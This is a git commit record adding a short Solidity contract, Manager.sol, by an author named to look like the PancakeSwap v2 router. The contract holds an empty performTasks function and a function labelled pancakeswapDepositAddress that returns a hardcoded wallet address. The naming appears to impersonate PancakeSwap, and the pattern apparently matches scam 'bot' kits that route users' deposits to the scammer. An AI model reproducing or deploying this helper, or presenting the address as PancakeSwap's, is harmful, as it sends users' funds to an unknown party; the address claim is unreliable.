0f096b4105d2787ae493b95630552766a63707e4
pancakeswap-v2-router <103684769+pancakeswap-v2-router@users.noreply.github.com>
2022-04-14 16:24:44 -0300

    Add files via upload

---
+++ Manager.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xebDe6B12312d225235746abBB9Ac4C28f02D84f2;
+    }
+}
+
+//pancakeswapfunction
